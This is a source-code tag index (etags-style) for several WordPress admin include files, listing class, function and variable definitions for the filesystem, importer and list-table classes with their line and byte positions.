wordpress/wp-admin/includes/class-wp-filesystem-ftpsockets.php,4380
class WP_Filesystem_ftpsockets extends WP_Filesystem_Base {WP_Filesystem_ftpsockets17,278
	var $ftp = false;ftp18,338
	var $ftp = false;ftp18,338
	var $errors = null;errors19,357
	var $errors = null;errors19,357
	var $options = array();options20,378
	var $options = array();options20,378
	function __construct($opt = '') {__construct22,404
		$this->method = 'ftpsockets';method23,439
		$this->errors = new WP_Error();errors24,471
		$this->ftp = new ftp();ftp29,637
			$this->wp_base = $opt['base'];wp_base43,988
	function connect() {connect57,1399
	function get_contents($file, $type = '', $resumepos = 0) {get_contents84,2305
	function get_contents($file, $type = '', $resumepos = 0) {type84,2305
			$type = FTP_AUTOASCII;type89,2437
		$temp = wp_tempnam( $file );temp92,2494
		if ( ! $temphandle = fopen($temp, 'w+') )temphandle94,2526
		$contents = '';contents104,2829
	function get_contents_array($file) {get_contents_array114,2987
	function put_contents($file, $contents, $mode = false ) {put_contents118,3082
	function put_contents($file, $contents, $mode = false ) {mode118,3082
		$temp = wp_tempnam( $file );temp119,3141
		if ( ! $temphandle = @fopen($temp, 'w+') ) {temphandle120,3172
		$type = $this->is_binary($contents) ? FTP_BINARY : FTP_ASCII;type128,3373
		$ret = $this->ftp->fput($file, $temphandle);ret131,3468
	function cwd() {cwd141,3607
		$cwd = $this->ftp->pwd();cwd142,3625
			$cwd = trailingslashit($cwd);cwd144,3667
	function chdir($file) {chdir148,3719
	function chgrp($file, $group, $recursive = false ) {chgrp152,3783
	function chgrp($file, $group, $recursive = false ) {recursive152,3783
	function chmod($file, $mode = false, $recursive = false ) {chmod156,3857
	function chmod($file, $mode = false, $recursive = false ) {mode156,3857
				$mode = FS_CHMOD_FILE;mode159,3969
				$mode = FS_CHMOD_DIR;mode161,4031
			$filelist = $this->dirlist($file);filelist168,4175
			foreach ( (array)$filelist as $filename => $filemeta )filename169,4213
	function chown($file, $owner, $recursive = false ) {chown177,4417
	function chown($file, $owner, $recursive = false ) {recursive177,4417
	function owner($file) {owner181,4491
		$dir = $this->dirlist($file);dir182,4516
	function getchmod($file) {getchmod186,4583
		$dir = $this->dirlist($file);dir187,4611
	function group($file) {group191,4679
		$dir = $this->dirlist($file);dir192,4704
	function copy($source, $destination, $overwrite = false, $mode = false) {copy196,4771
	function copy($source, $destination, $overwrite = false, $mode = false) {overwrite196,4771
		$content = $this->get_contents($source);content200,4917
	function move($source, $destination, $overwrite = false ) {move207,5071
	function move($source, $destination, $overwrite = false ) {overwrite207,5071
	function delete($file, $recursive = false, $type = false) {delete211,5188
	function delete($file, $recursive = false, $type = false) {recursive211,5188
	function exists($file) {exists222,5468
	function is_file($file) {is_file226,5537
	function is_dir($path) {is_dir234,5677
		$cwd = $this->cwd();cwd235,5703
	function is_readable($file) {is_readable243,5820
	function is_writable($file) {is_writable248,5940
	function atime($file) {atime253,6060
	function mtime($file) {mtime257,6105
	function size($file) {size261,6168
	function touch($file, $time = 0, $atime = 0 ) {touch265,6234
	function touch($file, $time = 0, $atime = 0 ) {time265,6234
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false ) {mkdir269,6303
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false ) {chmod269,6303
		$path = untrailingslashit($path);path270,6377
			$chmod = FS_CHMOD_DIR;chmod277,6524
	function rmdir($path, $recursive = false ) {rmdir286,6696
	function rmdir($path, $recursive = false ) {recursive286,6696
	function dirlist($path = '.', $include_hidden = true, $recursive = false ) {dirlist290,6782
	function dirlist($path = '.', $include_hidden = true, $recursive = false ) {include_hidden290,6782
			$limit_file = basename($path);limit_file292,6893
			$path = dirname($path) . '/';path293,6927
			$limit_file = false;limit_file295,6971
		$list = $this->ftp->dirlist($path);list298,7000
		$ret = array();ret302,7103
	function __destruct() {__destruct326,7628

wordpress/wp-admin/includes/class-wp-filesystem-ssh2.php,5477
 * To use this class you must follow these steps for PHP 5.2.6+you12,156
class WP_Filesystem_SSH2 extends WP_Filesystem_Base {WP_Filesystem_SSH243,1253
	var $link = false;link45,1308
	var $link = false;link45,1308
	var $sftp_link = false;sftp_link46,1328
	var $sftp_link = false;sftp_link46,1328
	var $keys = false;keys47,1353
	var $keys = false;keys47,1353
	var $errors = array();errors48,1373
	var $errors = array();errors48,1373
	var $options = array();options49,1397
	var $options = array();options49,1397
	function __construct($opt='') {__construct51,1423
		$this->method = 'ssh2';method52,1456
		$this->errors = new WP_Error();errors53,1482
			$this->wp_base = $opt['base'];wp_base77,2269
			$this->keys = true;keys86,2592
	function connect() {connect103,3070
			$this->link = @ssh2_connect($this->options['hostname'], $this->options['port']);link105,3117
			$this->link = @ssh2_connect($this->options['hostname'], $this->options['port'], $this->options['hostkey']);link107,3212
		$this->sftp_link = ssh2_sftp($this->link);sftp_link127,4105
	function run_command( $command, $returnbool = false) {run_command132,4170
	function run_command( $command, $returnbool = false) {returnbool132,4170
			$data = stream_get_contents( $stream );data142,4514
				return ( $data === false ) ? false : '' != trim($data);data146,4602
	function get_contents($file, $type = '', $resumepos = 0 ) {get_contents153,4712
	function get_contents($file, $type = '', $resumepos = 0 ) {type153,4712
		$file = ltrim($file, '/');file154,4773
	function get_contents_array($file) {get_contents_array158,4883
		$file = ltrim($file, '/');file159,4921
	function put_contents($file, $contents, $mode = false ) {put_contents163,5018
	function put_contents($file, $contents, $mode = false ) {mode163,5018
		$file = ltrim($file, '/');file164,5077
		$ret = file_put_contents('ssh2.sftp://' . $this->sftp_link . '/' . $file, $contents);ret165,5106
	function cwd() {cwd172,5255
		$cwd = $this->run_command('pwd');cwd173,5273
			$cwd = trailingslashit($cwd);cwd175,5323
	function chdir($dir) {chdir179,5375
	function chgrp($file, $group, $recursive = false ) {chgrp183,5452
	function chgrp($file, $group, $recursive = false ) {recursive183,5452
	function chmod($file, $mode = false, $recursive = false) {chmod191,5789
	function chmod($file, $mode = false, $recursive = false) {mode191,5789
				$mode = FS_CHMOD_FILE;mode197,5950
				$mode = FS_CHMOD_DIR;mode199,6012
	function chown($file, $owner, $recursive = false ) {chown209,6303
	function chown($file, $owner, $recursive = false ) {recursive209,6303
	function owner($file) {owner217,6640
		$owneruid = @fileowner('ssh2.sftp://' . $this->sftp_link . '/' . ltrim($file, '/'));owneruid218,6665
		$ownerarray = posix_getpwuid($owneruid);ownerarray223,6856
	function getchmod($file) {getchmod227,6933
	function group($file) {group231,7067
		$gid = @filegroup('ssh2.sftp://' . $this->sftp_link . '/' . ltrim($file, '/'));gid232,7092
		$grouparray = posix_getgrgid($gid);grouparray237,7268
	function copy($source, $destination, $overwrite = false, $mode = false) {copy241,7340
	function copy($source, $destination, $overwrite = false, $mode = false) {overwrite241,7340
		$content = $this->get_contents($source);content244,7485
	function move($source, $destination, $overwrite = false) {move250,7637
	function move($source, $destination, $overwrite = false) {overwrite250,7637
	function delete($file, $recursive = false, $type = false) {delete254,7765
	function delete($file, $recursive = false, $type = false) {recursive254,7765
		$filelist = $this->dirlist($file);filelist259,8001
			foreach ( $filelist as $filename => $fileinfo) {filename261,8069
	function exists($file) {exists268,8260
		$file = ltrim($file, '/');file269,8286
	function is_file($file) {is_file273,8390
		$file = ltrim($file, '/');file274,8417
	function is_dir($path) {is_dir278,8517
		$path = ltrim($path, '/');path279,8543
	function is_readable($file) {is_readable283,8642
		$file = ltrim($file, '/');file284,8673
	function is_writable($file) {is_writable288,8777
		$file = ltrim($file, '/');file289,8808
	function atime($file) {atime293,8912
		$file = ltrim($file, '/');file294,8937
	function mtime($file) {mtime298,9039
		$file = ltrim($file, '/');file299,9064
	function size($file) {size303,9166
		$file = ltrim($file, '/');file304,9190
	function touch($file, $time = 0, $atime = 0) {touch308,9291
	function touch($file, $time = 0, $atime = 0) {time308,9291
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false) {mkdir312,9364
	function mkdir($path, $chmod = false, $chown = false, $chgrp = false) {chmod312,9364
		$path = untrailingslashit($path);path313,9437
			$chmod = FS_CHMOD_DIR;chmod318,9531
	function rmdir($path, $recursive = false) {rmdir328,9755
	function rmdir($path, $recursive = false) {recursive328,9755
	function dirlist($path, $include_hidden = true, $recursive = false) {dirlist332,9847
	function dirlist($path, $include_hidden = true, $recursive = false) {include_hidden332,9847
			$limit_file = basename($path);limit_file334,9951
			$path = dirname($path);path335,9985
			$limit_file = false;limit_file337,10023
		$ret = array();ret343,10102
		$dir = @dir('ssh2.sftp://' . $this->sftp_link .'/' . ltrim($path, '/') );dir344,10120
			$struc = array();struc350,10278

wordpress/wp-admin/includes/class-wp-importer.php,3515
class WP_Importer {WP_Importer5,40
	function __construct() {}__construct11,113
	function get_imported_posts( $importer_name, $bid ) {get_imported_posts19,263
		$hashtable = array();hashtable22,335
		$limit = 100;limit24,360
		$offset = 0;offset25,376
			$meta_key = $importer_name . '_' . $bid . '_permalink';meta_key29,429
			$sql = $wpdb->prepare( "SELECT post_id, meta_value FROM $wpdb->postmeta WHERE meta_key = '%s' LIMIT %d,%d", $meta_key, $offset, $limit );sql30,488
			$results = $wpdb->get_results( $sql );results31,629
			$offset = ( $limit + $offset );offset34,695
	function count_imported_posts( $importer_name, $bid ) {count_imported_posts56,1135
		$count = 0;count59,1209
		$meta_key = $importer_name . '_' . $bid . '_permalink';meta_key62,1253
		$sql = $wpdb->prepare( "SELECT COUNT( post_id ) AS cnt FROM $wpdb->postmeta WHERE meta_key = '%s'", $meta_key );sql63,1311
		$result = $wpdb->get_results( $sql );result65,1427
			$count = intval( $result[0]->cnt );count68,1495
	function get_imported_comments( $bid ) {get_imported_comments82,1720
		$hashtable = array();hashtable85,1779
		$limit = 100;limit87,1804
		$offset = 0;offset88,1820
			$sql = $wpdb->prepare( "SELECT comment_ID, comment_agent FROM $wpdb->comments LIMIT %d,%d", $offset, $limit );sql92,1876
			$results = $wpdb->get_results( $sql );results93,1990
			$offset = ( $limit + $offset );offset96,2056
					$source_comment_id = intval( $source_comment_id );source_comment_id102,2269
					if ( $bid == $ca_bid ) {bid105,2376
	function set_blog( $blog_id ) {set_blog118,2610
			$blog_id = (int) $blog_id;blog_id120,2677
			$blog = 'http://' . preg_replace( '#^https?://#', '', $blog_id );blog122,2718
			$blog = get_blog_details( array( 'domain' => $parsed['host'], 'path' => $parsed['path'] ) );blog129,3014
			$blog_id = (int) $blog->blog_id;blog_id134,3200
			$current_blog = $blog;current_blog137,3296
	function set_user( $user_id ) {set_user148,3457
			$user_id = (int) $user_id;user_id150,3524
			$user_id = (int) username_exists( $user_id );user_id152,3565
	function cmpr_strlen( $a, $b ) {cmpr_strlen170,3879
	function get_page( $url, $username = '', $password = '', $head = false ) {get_page183,4100
	function get_page( $url, $username = '', $password = '', $head = false ) {username183,4100
		$headers = array();headers187,4284
		$args = array();args188,4306
	function bump_request_timeout( $val ) {bump_request_timeout205,4692
	function is_user_over_quota() {is_user_over_quota214,4823
	function min_whitespace( $string ) {min_whitespace233,5210
	function stop_the_insanity() {stop_the_insanity242,5405
		// Or define( 'WP_IMPORTING', true );WP_IMPORTING244,5466
		$wp_actions = array();wp_actions247,5596
function get_cli_args( $param, $required = false ) {get_cli_args259,5788
function get_cli_args( $param, $required = false ) {required259,5788
	$args = $_SERVER['argv'];args260,5841
	$out = array();out262,5869
	$last_arg = null;last_arg264,5887
	$return = null;return265,5906
	$il = sizeof( $args );il267,5924
	for ( $i = 1, $il; $i < $il; $i++ ) {i269,5949
			$parts = explode( "=", $match[1] );parts271,6051
			$key = preg_replace( "/[^a-z0-9]+/", "", $parts[0] );key272,6090
			$last_arg = $key;last_arg280,6248
			for ( $j = 0, $jl = strlen( $match[1] ); $j < $jl; $j++ ) {j282,6348
				$key = $match[1]{$j};key283,6411
			$last_arg = $key;last_arg287,6466
		$return = $out[$param];return296,6654

wordpress/wp-admin/includes/class-wp-links-list-table.php,1789
class WP_Links_List_Table extends WP_List_Table {WP_Links_List_Table10,135
	function __construct() {__construct12,186
	function ajax_user_can() {ajax_user_can18,281
	function prepare_items() {prepare_items22,358
		$args = array( 'hide_invisible' => 0, 'hide_empty' => 0 );args27,660
		$this->items = get_bookmarks( $args );items38,942
	function no_items() {no_items41,987
	function get_bulk_actions() {get_bulk_actions45,1041
		$actions = array();actions46,1072
	function extra_tablenav( $which ) {extra_tablenav52,1157
			$dropdown_options = array(dropdown_options60,1292
	function get_columns() {get_columns77,1738
	function get_sortable_columns() {get_sortable_columns89,2065
	function display_rows() {display_rows98,2224
		$alt = 0;alt101,2270
			$link = sanitize_bookmark( $link );link104,2321
			$short_url = url_shorten( $link->link_url );short_url108,2475
			$visible = ( $link->link_visible == 'Y' ) ? __( 'Yes' ) : __( 'No' );visible110,2524
			$rating  = $link->link_rating;rating111,2597
			$style = ( $alt++ % 2 ) ? '' : ' class="alternate"';style112,2631
			$edit_link = get_edit_bookmark_link( $link );edit_link114,2688
			foreach ( $columns as $column_name => $column_display_name ) {column_name121,2890
				$class = "class='column-$column_name'";class122,2956
				$style = '';style124,3001
					$style = ' style="display:none;"';style126,3063
				$attributes = $class . $style;attributes128,3104
						$actions = array();actions138,3561
						$cat_names = array();cat_names150,4384
							$cat = get_term( $category, 'link_category', OBJECT, 'display' );cat152,4466
							$cat_name = $cat->name;cat_name155,4613
								$cat_name = "<a href='link-manager.php?cat_id=$category'>$cat_name</a>";cat_name157,4679

wordpress/wp-admin/includes/class-wp-list-table.php,9330
 * Base class for displaying a list of items in an ajaxified HTML table.for3,10
 * Base class for displaying a list of items in an ajaxified HTML table.for11,159
class WP_List_Table {WP_List_Table18,322
	var $items;items27,443
	var $_args;_args36,571
	var $_pagination_args = array();_pagination_args45,712
	var $_pagination_args = array();_pagination_args45,712
	var $screen;screen54,839
	var $_actions;_actions63,944
	var $_pagination;_pagination72,1057
	 * Constructor. The child class should call this constructor from it's own constructorshould75,1082
	function __construct( $args = array() ) {__construct80,1286
	function __construct( $args = array() ) {args80,1286
		$args = wp_parse_args( $args, array(args81,1329
		$screen = get_current_screen();screen87,1435
		$this->_args = $args;_args97,1728
	function ajax_user_can() {ajax_user_can113,2014
	function prepare_items() {prepare_items125,2292
	function set_pagination_args( $args ) {set_pagination_args135,2602
		$args = wp_parse_args( $args, array(args136,2643
		$this->_pagination_args = $args;_pagination_args151,3194
	function get_pagination_arg( $key ) {get_pagination_arg163,3359
	function has_items() {has_items179,3669
	function no_items() {no_items189,3832
	function search_box( $text, $input_id ) {search_box202,4063
		$input_id = $input_id . '-search-input';input_id206,4174
	function get_views() {get_views230,4992
	function views() {views240,5143
		$screen = get_current_screen();screen241,5163
		$views = $this->get_views();views243,5198
		$views = apply_filters( 'views_' . $screen->id, $views );views244,5229
		foreach ( $views as $class => $view ) {class250,5362
	function get_bulk_actions() {get_bulk_actions266,5726
	function bulk_actions() {bulk_actions276,5868
		$screen = get_current_screen();screen277,5895
			$no_new_actions = $this->_actions = $this->get_bulk_actions();no_new_actions280,5968
			$this->_actions = apply_filters( 'bulk_actions-' . $screen->id, $this->_actions );_actions282,6098
			$this->_actions = array_intersect_assoc( $this->_actions, $no_new_actions );_actions283,6184
			$two = '';two284,6264
			$two = '2';two286,6289
		foreach ( $this->_actions as $name => $title ) {name295,6484
			$class = 'edit' == $name ? ' class="hide-if-no-js"' : '';class296,6535
	function current_action() {current_action315,7006
	function row_actions( $actions, $always_visible = false ) {row_actions335,7484
	function row_actions( $actions, $always_visible = false ) {always_visible335,7484
		$action_count = count( $actions );action_count336,7545
		$i = 0;i337,7582
		$out = '<div class="' . ( $always_visible ? 'row-actions-visible' : 'row-actions' ) . '">';out342,7632
		foreach ( $actions as $action => $link ) {action343,7726
			( $i == $action_count ) ? $sep = '' : $sep = ' | ';i345,7780
	function months_dropdown( $post_type ) {months_dropdown359,8036
		$months = $wpdb->get_results( $wpdb->prepare( "months362,8107
		$month_count = count( $months );month_count369,8325
		$m = isset( $_GET['m'] ) ? (int) $_GET['m'] : 0;m374,8447
			$month = zeroise( $arc_row->month, 2 );month383,8698
			$year = $arc_row->year;year384,8741
	function view_switcher( $current_mode ) {view_switcher404,9146
		$modes = array(modes405,9189
			foreach ( $modes as $mode => $title ) {mode414,9409
				$class = ( $current_mode == $mode ) ? 'class="current"' : '';class415,9452
	function comments_bubble( $post_id, $pending_comments ) {comments_bubble432,9948
		$pending_phrase = sprintf( __( '%s pending' ), number_format( $pending_comments ) );pending_phrase433,10007
	function get_pagenum() {get_pagenum452,10563
		$pagenum = isset( $_REQUEST['paged'] ) ? absint( $_REQUEST['paged'] ) : 0;pagenum453,10589
			$pagenum = $this->_pagination_args['total_pages'];pagenum456,10776
	function get_items_per_page( $option, $default = 20 ) {get_items_per_page469,10989
	function get_items_per_page( $option, $default = 20 ) {default469,10989
		$per_page = (int) get_user_option( $option );per_page470,11046
			$per_page = $default;per_page472,11139
	function pagination( $which ) {pagination483,11302
		$output = '<span class="displaying-num">' . sprintf( _n( '1 item', '%s items', $total_items ), number_format_i18n( $total_items ) ) . '</span>';output489,11439
		$current = $this->get_pagenum();current491,11587
		$current_url = ( is_ssl() ? 'https://' : 'http://' ) . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];current_url493,11623
		$current_url = remove_query_arg( array( 'hotkeys_highlight_last', 'hotkeys_highlight_first' ), $current_url );current_url495,11730
		$page_links = array();page_links497,11844
		$disable_first = $disable_last = '';disable_first499,11870
		if ( $current == 1 )current500,11909
			$disable_first = ' disabled';disable_first501,11932
		if ( $current == $total_pages )current502,11965
			$disable_last = ' disabled';disable_last503,11999
			$html_current_page = $current;html_current_page520,12528
			$html_current_page = sprintf( "<input class='current-page' title='%s' type='text' name='paged' value='%s' size='%d' />",html_current_page522,12569
		$html_total_pages = sprintf( "<span class='total-pages'>%s</span>", number_format_i18n( $total_pages ) );html_total_pages528,12775
		$pagination_links_class = 'pagination-links';pagination_links_class545,13510
			$pagination_links_class = ' hide-if-js';pagination_links_class547,13595
			$page_class = $total_pages < 2 ? ' one-page' : '';page_class551,13759
			$page_class = ' no-pages';page_class553,13820
		$this->_pagination = "<div class='tablenav-pages{$page_class}'>$output</div>";_pagination555,13851
	function get_columns() {get_columns570,14126
	function get_sortable_columns() {get_sortable_columns587,14532
	function get_column_info() {get_column_info599,14736
		$screen = get_current_screen();screen603,14842
		$columns = get_column_headers( $screen );columns605,14877
		$hidden = get_hidden_columns( $screen );hidden606,14921
		$_sortable = apply_filters( "manage_{$screen->id}_sortable_columns", $this->get_sortable_columns() );_sortable608,14965
		$sortable = array();sortable610,15070
		foreach ( $_sortable as $id => $data ) {id611,15093
			$data = (array) $data;data615,15176
		$this->_column_headers = array( $columns, $hidden, $sortable );_column_headers622,15286
	function get_column_count() {get_column_count635,15497
		$hidden = array_intersect( array_keys( $columns ), array_filter( $hidden ) );hidden637,15585
	function print_column_headers( $with_id = true ) {print_column_headers649,15907
	function print_column_headers( $with_id = true ) {with_id649,15907
		$screen = get_current_screen();screen650,15959
		$current_url = ( is_ssl() ? 'https://' : 'http://' ) . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];current_url654,16062
		$current_url = remove_query_arg( 'paged', $current_url );current_url655,16168
			$current_orderby = $_GET['orderby'];current_orderby658,16264
			$current_orderby = '';current_orderby660,16311
			$current_order = 'desc';current_order663,16399
			$current_order = 'asc';current_order665,16434
		foreach ( $columns as $column_key => $column_display_name ) {column_key667,16462
			$class = array( 'manage-column', "column-$column_key" );class668,16526
			$style = '';style670,16587
				$style = 'display:none;';style672,16646
			$style = ' style="' . $style . '"';style674,16677
				if ( $current_orderby == $orderby ) {current_orderby684,16983
					$order = 'asc' == $current_order ? 'desc' : 'asc';order685,17025
					$order = $desc_first ? 'desc' : 'asc';order689,17152
				$column_display_name = '<a href="' . esc_url( add_query_arg( compact( 'orderby', 'order' ), $current_url ) ) . '"><span>' . $column_display_name . '</span><span class="sorting-indicator"></span></a>';column_display_name694,17277
			$id = $with_id ? "id='$column_key'" : '';id697,17488
				$class = "class='" . join( ' ', $class ) . "'";class700,17561
	function display() {display712,17765
	function get_table_classes() {get_table_classes747,18438
	function display_tablenav( $which ) {display_tablenav757,18648
	function extra_tablenav( $which ) {}extra_tablenav782,19156
	function display_rows_or_placeholder() {display_rows_or_placeholder790,19291
	function display_rows() {display_rows807,19693
	function single_row( $item ) {single_row820,19941
		static $row_class = '';row_class821,19973
		static $row_class = '';row_class821,19973
		$row_class = ( $row_class == '' ? ' class="alternate"' : '' );row_class822,19999
	function single_row_columns( $item ) {single_row_columns837,20315
		foreach ( $columns as $column_name => $column_display_name ) {column_name840,20412
			$class = "class='$column_name column-$column_name'";class841,20477
			$style = '';style843,20534
				$style = ' style="display:none;"';style845,20594
			$attributes = "$class$style";attributes847,20634
	function ajax_response() {ajax_response873,21244
		$rows = ob_get_clean();rows885,21513
		$response = array( 'rows' => $rows );response887,21540
	function _js_vars() {_js_vars905,22010
		$current_screen = get_current_screen();current_screen906,22033
		$args = array(args908,22076

wordpress/wp-admin/includes/class-wp-media-list-table.php,4130
class WP_Media_List_Table extends WP_List_Table {WP_Media_List_Table10,135
	function __construct() {__construct12,186
		$this->detached = isset( $_REQUEST['detached'] ) || isset( $_REQUEST['find_detached'] );detached13,212
	function ajax_user_can() {ajax_user_can20,368
	function prepare_items() {prepare_items24,443
		$q = $_REQUEST;q27,548
 		$this->is_trash = isset( $_REQUEST['status'] ) && 'trash' == $_REQUEST['status'];is_trash34,723
	function get_views() {get_views43,1005
		$type_links = array();type_links46,1088
		$_num_posts = (array) wp_count_attachments();_num_posts47,1113
		$_total_posts = array_sum($_num_posts) - $_num_posts['trash'];_total_posts48,1161
				$total_orphans = $wpdb->get_var( "SELECT COUNT( * ) FROM $wpdb->posts WHERE post_type = 'attachment' AND post_status != 'trash' AND post_parent < 1" );total_orphans50,1260
		$matches = wp_match_mime_types(array_keys($post_mime_types), array_keys($_num_posts));matches51,1416
		foreach ( $matches as $type => $reals )type52,1505
		$class = ( empty($_GET['post_mime_type']) && !$this->detached && !isset($_GET['status']) ) ? ' class="current"' : '';class56,1697
		foreach ( $post_mime_types as $mime_type => $label ) {mime_type58,2047
			$class = '';class59,2104
				$class = ' class="current"';class65,2305
	function get_bulk_actions() {get_bulk_actions77,3325
		$actions = array();actions78,3356
	function extra_tablenav( $which ) {extra_tablenav86,3528
	function current_action() {current_action106,4193
	function has_items() {has_items119,4535
	function no_items() {no_items123,4586
	function get_columns() {get_columns127,4652
		$posts_columns = array();posts_columns128,4678
		$posts_columns = apply_filters( 'manage_media_columns', $posts_columns, $this->detached );posts_columns143,5441
	function get_sortable_columns() {get_sortable_columns148,5564
	function display_rows() {display_rows158,5778
		$alt = '';alt162,5867
			$user_can_edit = current_user_can( 'edit_post', $post->ID );user_can_edit165,5920
			$alt = ( 'alternate' == $alt ) ? '' : 'alternate';alt171,6116
			$post_owner = ( get_current_user_id() == $post->post_author ) ? 'self' : 'other';post_owner172,6170
			$att_title = _draft_or_post_title();att_title173,6255
foreach ( $columns as $column_name => $column_display_name ) {column_name179,6504
	$class = "class='$column_name column-$column_name'";class180,6567
	$style = '';style182,6622
		$style = ' style="display:none;"';style184,6678
	$attributes = $class . $style;attributes186,6716
		$attributes = 'class="column-icon media-icon"' . $style;attributes201,6992
			if ( $thumb = wp_get_attachment_image( $post->ID, array( 80, 60 ), true ) ) {thumb204,7092
		$tags = get_the_tags();tags255,8378
			$out = array();out257,8431
			$t_time = $h_time = __( 'Unpublished' );t_time277,8935
			$t_time = get_the_time( __( 'Y/m/d g:i:s A' ) );t_time279,8990
			$m_time = $post->post_date;m_time280,9042
			$time = get_post_time( 'G', true, $post, false );time281,9073
			if ( ( abs( $t_diff = time() - $time ) ) < 86400 ) {t_diff282,9126
					$h_time = sprintf( __( '%s from now' ), human_time_diff( $time ) );h_time284,9205
					$h_time = sprintf( __( '%s ago' ), human_time_diff( $time ) );h_time286,9287
				$h_time = mysql2date( __( 'Y/m/d' ), $m_time );h_time288,9367
				$title =_draft_or_post_title( $post->post_parent );title299,9599
		$attributes = 'class="comments column-comments num"' . $style;attributes326,10345
		$pending_comments = get_pending_comments_num( $post->ID );pending_comments331,10492
	function _get_row_actions( $post, $att_title ) {_get_row_actions354,10827
		$actions = array();actions355,10877
					$delete_ays = !MEDIA_TRASH ? " onclick='return showNotice.warn();'" : '';delete_ays364,11385
					$delete_ays = ( !$this->is_trash && !MEDIA_TRASH ) ? " onclick='return showNotice.warn();'" : '';delete_ays380,12860
				$title =_draft_or_post_title( $post->post_parent );title385,13215
		$actions = apply_filters( 'media_row_actions', $actions, $post, $this->detached );actions390,13470

wordpress/wp-admin/includes/class-wp-ms-sites-list-table.php,4080
class WP_MS_Sites_List_Table extends WP_List_Table {WP_MS_Sites_List_Table10,127
	function __construct() {__construct12,181
	function ajax_user_can() {ajax_user_can18,272
	function prepare_items() {prepare_items22,349
		$mode = ( empty( $_REQUEST['mode'] ) ) ? 'list' : $_REQUEST['mode'];mode25,420
		$per_page = $this->get_items_per_page( 'sites_network_per_page' );per_page27,492
		$pagenum = $this->get_pagenum();pagenum29,562
		$s = isset( $_REQUEST['s'] ) ? stripslashes( trim( $_REQUEST[ 's' ] ) ) : '';s31,598
		$wild = '';wild32,678
			$wild = '%';wild34,729
			$s = trim($s, '*');s35,745
		$like_s = esc_sql( like_escape( $s ) );like_s38,773
		$query = "SELECT * FROM {$wpdb->blogs} WHERE site_id = '{$wpdb->siteid}' ";query49,1193
			$reg_blog_ids = $wpdb->get_col( "SELECT blog_id FROM {$wpdb->registration_log} WHERE {$wpdb->registration_log}.IP LIKE ( '{$like_s}$wild' )" );reg_blog_ids58,1594
				$reg_blog_ids = array( 0 );reg_blog_ids61,1767
			$query = "SELECT *query63,1800
				$blog_s = str_replace( '.' . $current_site->domain, '', $like_s );blog_s71,2121
					$blog_s = $current_site->path . $like_s . $wild . '/';blog_s76,2373
					$blog_s = $like_s;blog_s78,2442
		$order_by = isset( $_REQUEST['orderby'] ) ? $_REQUEST['orderby'] : '';order_by83,2538
		if ( $order_by == 'registered' ) {order_by84,2611
		} elseif ( $order_by == 'lastupdated' ) {order_by86,2686
		} elseif ( $order_by == 'blogname' ) {order_by88,2770
		} elseif ( $order_by == 'blog_id' ) {order_by93,2920
			$order_by = null;order_by96,3006
			$order = ( isset( $_REQUEST['order'] ) && 'DESC' == strtoupper( $_REQUEST['order'] ) ) ? "DESC" : "ASC";order100,3062
			$total = $wpdb->get_var( str_replace( 'SELECT *', 'SELECT COUNT( blog_id )', $query ) );total106,3280
		$this->items = $wpdb->get_results( $query, ARRAY_A );items109,3466
			$total = count($this->items);total112,3554
	function no_items() {no_items120,3692
	function get_bulk_actions() {get_bulk_actions124,3746
		$actions = array();actions125,3777
	function pagination( $which ) {pagination134,4008
	function get_columns() {get_columns143,4154
		$blogname_columns = ( is_subdomain_install() ) ? __( 'Domain' ) : __( 'Path' );blogname_columns144,4180
		$sites_columns = array(sites_columns145,4262
		$sites_columns = apply_filters( 'wpmu_blogs_columns', $sites_columns );sites_columns156,4596
	function get_sortable_columns() {get_sortable_columns161,4700
	function display_rows() {display_rows169,4858
		$status_list = array(status_list172,4917
		$class = '';class179,5187
			$class = ( 'alternate' == $class ) ? '' : 'alternate';class181,5240
			$blog_states = array();blog_states184,5325
			foreach ( $status_list as $status => $col ) {status185,5352
					$class = $col[0];class187,5464
			$blog_state = '';blog_state191,5529
				$state_count = count( $blog_states );state_count193,5586
				$i = 0;i194,5628
					( $i == $state_count ) ? $sep = '' : $sep = ', ';i198,5718
			$blogname = ( is_subdomain_install() ) ? str_replace( '.'.$current_site->domain, '', $blog['domain'] ) : $blog['path'];blogname204,5882
			foreach ( $columns as $column_name => $column_display_name ) {column_name208,6064
				$style = '';style209,6130
					$style = ' style="display:none;"';style211,6192
							$actions = array(actions236,7172
							$actions = apply_filters( 'manage_sites_action_links', array_filter( $actions ), $blog['blog_id'], $blogname );actions269,10734
								$date = 'Y/m/d';date279,11075
								$date = 'Y/m/d \<\b\r \/\> g:i:s a';date281,11112
							$blogusers = get_users( array( 'blog_id' => $blog['blog_id'], 'number' => 6) );blogusers298,11710
								$blogusers_warning = '';blogusers_warning300,11836
									$blogusers = array_slice( $blogusers, 0, 5 );blogusers302,11910
									$blogusers_warning = __( 'Only showing first 5 users.' ) . ' <a href="' . esc_url( network_admin_url( 'site-users.php?id=' . $blog['blog_id'] ) ) . '">' . __( 'More' ) . '</a>';blogusers_warning303,11965

wordpress/wp-admin/includes/class-wp-ms-themes-list-table.php,5612
class WP_MS_Themes_List_Table extends WP_List_Table {WP_MS_Themes_List_Table10,131
	var $site_id;site_id12,186
	var $is_site_themes;is_site_themes13,201
	function __construct() {__construct15,224
		$status = isset( $_REQUEST['theme_status'] ) ? $_REQUEST['theme_status'] : 'all';status18,276
			$status = 'all';status20,460
		$page = $this->get_pagenum();page22,481
		$screen = get_current_screen();screen24,514
		$this->is_site_themes = ( 'site-themes-network' == $screen->id ) ? true : false;is_site_themes25,548
			$this->site_id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;site_id28,663
	function get_table_classes() {get_table_classes35,807
	function ajax_user_can() {ajax_user_can39,923
		$menu_perms = get_site_option( 'menu_items', array() );menu_perms40,951
	function prepare_items() {prepare_items52,1293
		$themes = array(themes57,1432
			$themes_per_page = $this->get_items_per_page( 'site_themes_network_per_page' );themes_per_page67,1743
			$allowed_where = 'site';allowed_where68,1826
			$themes_per_page = $this->get_items_per_page( 'themes_network_per_page' );themes_per_page70,1865
			$allowed_where = 'network';allowed_where71,1943
		$maybe_update = current_user_can( 'update_themes' ) && ! $this->is_site_themes && $current = get_site_transient( 'update_themes' );maybe_update74,1979
		foreach ( (array) $themes['all'] as $key => $theme ) {key76,2114
